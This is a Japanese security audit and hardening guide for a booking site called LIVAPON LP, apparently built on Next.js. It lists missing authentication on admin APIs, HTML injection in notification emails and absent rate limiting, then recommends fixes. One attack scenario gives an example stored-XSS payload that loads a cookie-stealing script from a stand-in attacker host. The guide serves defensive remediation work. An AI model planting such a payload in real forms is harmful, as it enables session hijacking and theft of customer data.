# セキュリティ診断・強化ガイド (Security Reinforcement Guide)

LIVAPON LPのコードベースにおけるセキュリティ脆弱性の診断結果と、それに対する具体的な強化策をまとめました。

## 1. 診断結果サマリー

ハッカーの視点で分析した結果、以下の**致命的(Critical)**および**高(High)**レベルの脆弱性が確認されました。

| 重要度 | カテゴリ | 脆弱性の内容 | 影響 |
| :--- | :--- | :--- | :--- |
| **Critical** | 認証・認認可 | 管理者用API (`/api/bookings`) が完全に無防備 | 顧客の個人情報（名前、メール、会社名）が誰でも取得可能 |
| **Critical** | 認可 | 予約の承認・拒否APIに認証がない | 攻撃者が任意の予約を勝手に承認・拒否できる |
| **High** | インジェクション | メールのHTMLテンプレートにユーザー入力を直接埋め込んでいる | **XSS (HTML Injection)** 攻撃により、管理者のブラウザで悪質なスクリプトが実行される |
| **High** | 可用性 | レートリミット（回数制限）がない | 大量のメール送信によるSMTP制限の超過や、サーバー負荷増大（DoS）の恐れ |
| **Medium** | データ保護 | 予約データがメモリ上のみに存在 | サーバー再起動で全データ消失。またメモリ消費の増大によるクラッシュの可能性 |

---

## 2. 具体的な攻撃シナリオ

### シナリオA: 個人情報の流出 (Broken Access Control)
1. 攻撃者がブラウザや `curl` で `GET /api/bookings` にアクセスする。
2. サーバーは認証を要求せず、保存されている全ての予約データ（個人情報を含む）をJSONで返却する。
3. **結果**: 顧客名簿が外部に流出する。

### シナリオB: 管理者権限の奪取 (Stored XSS)
1. 攻撃者が問い合わせフォームの「メッセージ」欄に `<script src="https://attacker.com/steal-cookie.js"></script>` を入力して送信する。
2. 管理者にメールが届き、メールクライアント（Gmail Web版など）でそのメッセージを表示する。
3. スクリプトが実行され、管理者のセッション情報や機密データが攻撃者に送信される。
4. **結果**: 管理者のアカウントが乗っ取られる、または社内情報が漏洩する。

---

## 3. 推奨されるセキュリティ強化策

### 3.1 認証・認可の実装 (優先度: 最優先)
- [ ] **管理者画面の保護**: NextAuth.js などを導入し、`/api/bookings` 関連のルートに認証チェックを追加する。
- [ ] **API Key / Token**: 管理アプリからのアクセスには、環境変数で管理された API Key を要求するようにする。

### 3.2 入力値のサニタイズ (優先度: 高)
- [ ] **エスケープ処理**: `nodemailer` で送信する HTML 内のユーザー入力を、HTMLエスケープ関数を通して無害化する。
- [ ] **バリデーションライブラリの導入**: `zod` などを使い、メールアドレスの形式や文字数制限を厳格にチェックする。

### 3.3 レートリミットの導入 (優先度: 高)
- [ ] **送信制限**: IPアドレス単位で1時間に送信できるフォームの回数を制限する（`upstash/ratelimit` や `redis` の使用を推奨）。

### 3.4 データベースへの移行 (優先度: 中)
- [ ] **永続化**: インメモリの `Map` ではなく、SupabaseやPostgreSQL、あるいはVercel KVなどのデータベースにデータを保存する。

### 3.5 公開設定の見直し
- [ ] **PPR / Static Export**: Next.js の `next.config.ts` で機密情報が意図せずクライアントサイドに露出しないよう、`server-only` パッケージを使用する。

---

## 4. セキュリティチェックリスト (開発者向け)

- [ ] `.env` ファイルが `.gitignore` に含まれているか
- [ ] ユーザー入力がそのまま `dangerouslySetInnerHTML` やメールの HTML に使われていないか
- [ ] 管理者機能にアクセスする際、必ず有効なセッションがあるか
- [ ] 本番環境の `NODE_ENV` が `production` になっているか
- [ ] 依存ライブラリに `npm audit` で警告が出ていないか
